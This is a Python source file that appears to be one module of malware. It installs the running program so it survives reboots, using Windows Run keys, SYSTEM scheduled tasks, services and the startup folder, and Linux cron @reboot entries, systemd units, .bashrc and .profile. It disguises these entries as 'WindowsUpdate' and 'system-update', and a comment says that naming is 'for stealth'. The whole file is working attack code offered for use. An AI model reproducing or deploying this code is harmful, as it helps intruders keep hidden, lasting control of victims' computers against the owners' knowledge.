import os
import sys
import platform
import subprocess
import logging
import winreg
import ctypes
import win32api
import win32con
import win32security
import win32process
import win32event
import win32service
import win32serviceutil
import win32timezone
import shutil
from datetime import datetime

class Persistence:
    def __init__(self):
        self.os_type = platform.system()
        self.setup_logging()
        
    def setup_logging(self):
        logging.basicConfig(
            level=logging.INFO,
            format='%(asctime)s - %(levelname)s - %(message)s',
            handlers=[
                logging.FileHandler('persistence.log'),
                logging.StreamHandler()
            ]
        )
        
    def add_registry_startup(self, name, path):
        """Add registry startup entry"""
        try:
            if self.os_type == 'Windows':
                key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run")
                winreg.SetValueEx(key, name, 0, winreg.REG_SZ, path)
                winreg.CloseKey(key)
                logging.info(f"Added registry startup entry: {name}")
                return True
            return False
        except Exception as e:
            logging.error(f"Registry startup error: {str(e)}")
            return False
            
    def add_scheduled_task(self, name, command):
        """Add scheduled task"""
        try:
            if self.os_type == 'Windows':
                cmd = f'schtasks /create /tn "{name}" /tr "{command}" /sc onstart /ru System'
                subprocess.run(cmd, shell=True, check=True)
                logging.info(f"Added scheduled task: {name}")
                return True
            return False
        except Exception as e:
            logging.error(f"Scheduled task error: {str(e)}")
            return False
            
    def add_service(self, name, path):
        """Add Windows service"""
        try:
            if self.os_type == 'Windows':
                cmd = f'sc create "{name}" binPath= "{path}" start= auto'
                subprocess.run(cmd, shell=True, check=True)
                cmd = f'sc start "{name}"'
                subprocess.run(cmd, shell=True, check=True)
                logging.info(f"Added service: {name}")
                return True
            return False
        except Exception as e:
            logging.error(f"Service creation error: {str(e)}")
            return False
            
    def add_startup_folder(self, name, path):
        """Add shortcut to startup folder"""
        try:
            if self.os_type == 'Windows':
                startup_folder = os.path.join(os.getenv('APPDATA'), r'Microsoft\Windows\Start Menu\Programs\Startup')
                shortcut_path = os.path.join(startup_folder, f"{name}.lnk")
                
                # Create shortcut
                with open(shortcut_path, 'w') as f:
                    f.write(f'@echo off\nstart "" "{path}"')
                    
                logging.info(f"Added startup folder entry: {name}")
                return True
            return False
        except Exception as e:
            logging.error(f"Startup folder error: {str(e)}")
            return False
            
    def add_cron_job(self, command):
        """Add cron job (Linux)"""
        try:
            if self.os_type == 'Linux':
                # Get current crontab
                current_crontab = subprocess.check_output(['crontab', '-l']).decode()
                
                # Add new entry
                new_entry = f"@reboot {command}\n"
                new_crontab = current_crontab + new_entry
                
                # Write new crontab
                with open('/tmp/crontab', 'w') as f:
                    f.write(new_crontab)
                    
                subprocess.run(['crontab', '/tmp/crontab'], check=True)
                os.remove('/tmp/crontab')
                
                logging.info("Added cron job")
                return True
            return False
        except Exception as e:
            logging.error(f"Cron job error: {str(e)}")
            return False
            
    def add_systemd_service(self, name, command):
        """Add systemd service (Linux)"""
        try:
            if self.os_type == 'Linux':
                service_file = f"/etc/systemd/system/{name}.service"
                
                service_content = f"""[Unit]
Description={name}
After=network.target

[Service]
Type=simple
ExecStart={command}
Restart=always
RestartSec=3

[Install]
WantedBy=multi-user.target
"""
                
                with open(service_file, 'w') as f:
                    f.write(service_content)
                    
                subprocess.run(['systemctl', 'daemon-reload'], check=True)
                subprocess.run(['systemctl', 'enable', name], check=True)
                subprocess.run(['systemctl', 'start', name], check=True)
                
                logging.info(f"Added systemd service: {name}")
                return True
            return False
        except Exception as e:
            logging.error(f"Systemd service error: {str(e)}")
            return False
            
    def add_bashrc(self, command):
        """Add command to .bashrc (Linux)"""
        try:
            if self.os_type == 'Linux':
                bashrc = os.path.expanduser('~/.bashrc')
                with open(bashrc, 'a') as f:
                    f.write(f"\n{command}\n")
                logging.info("Added command to .bashrc")
                return True
            return False
        except Exception as e:
            logging.error(f"Bashrc error: {str(e)}")
            return False
            
    def add_profile(self, command):
        """Add command to .profile (Linux)"""
        try:
            if self.os_type == 'Linux':
                profile = os.path.expanduser('~/.profile')
                with open(profile, 'a') as f:
                    f.write(f"\n{command}\n")
                logging.info("Added command to .profile")
                return True
            return False
        except Exception as e:
            logging.error(f"Profile error: {str(e)}")
            return False
            
    def add_all_windows(self, name, path):
        """Add all Windows persistence mechanisms"""
        results = {
            'registry': self.add_registry_startup(name, path),
            'scheduled_task': self.add_scheduled_task(name, path),
            'service': self.add_service(name, path),
            'startup_folder': self.add_startup_folder(name, path)
        }
        return results
        
    def add_all_linux(self, command):
        """Add all Linux persistence mechanisms"""
        results = {
            'cron': self.add_cron_job(command),
            'systemd': self.add_systemd_service('persistence', command),
            'bashrc': self.add_bashrc(command),
            'profile': self.add_profile(command)
        }
        return results 

def install_persistence(method='registry'):
    """Install persistence using specified method
    
    Args:
        method (str): Persistence method to use. Options:
            Windows: 'registry', 'scheduled_task', 'service', 'startup_folder', 'all'
            Linux: 'cron', 'systemd', 'bashrc', 'profile', 'all'
    """
    try:
        persistence = Persistence()
        current_path = os.path.abspath(sys.argv[0])
        
        if platform.system() == 'Windows':
            name = "WindowsUpdate"  # Generic name for stealth
            if method == 'registry':
                success = persistence.add_registry_startup(name, current_path)
            elif method == 'scheduled_task':
                success = persistence.add_scheduled_task(name, current_path)
            elif method == 'service':
                success = persistence.add_service(name, current_path)
            elif method == 'startup_folder':
                success = persistence.add_startup_folder(name, current_path)
            elif method == 'all':
                results = persistence.add_all_windows(name, current_path)
                success = any(results.values())
            else:
                return {
                    'status': 'error',
                    'error': f'Unknown Windows persistence method: {method}',
                    'timestamp': datetime.now().isoformat()
                }
        else:  # Linux
            if method == 'cron':
                success = persistence.add_cron_job(current_path)
            elif method == 'systemd':
                success = persistence.add_systemd_service('system-update', current_path)
            elif method == 'bashrc':
                success = persistence.add_bashrc(current_path)
            elif method == 'profile':
                success = persistence.add_profile(current_path)
            elif method == 'all':
                results = persistence.add_all_linux(current_path)
                success = any(results.values())
            else:
                return {
                    'status': 'error',
                    'error': f'Unknown Linux persistence method: {method}',
                    'timestamp': datetime.now().isoformat()
                }
        
        if success:
            return {
                'status': 'success',
                'message': f'Successfully installed persistence using method: {method}',
                'timestamp': datetime.now().isoformat()
            }
        else:
            return {
                'status': 'error',
                'error': f'Failed to install persistence using method: {method}',
                'timestamp': datetime.now().isoformat()
            }
            
    except Exception as e:
        logging.error(f"Persistence installation error: {str(e)}")
        return {
            'status': 'error',
            'error': str(e),
            'timestamp': datetime.now().isoformat()
        } 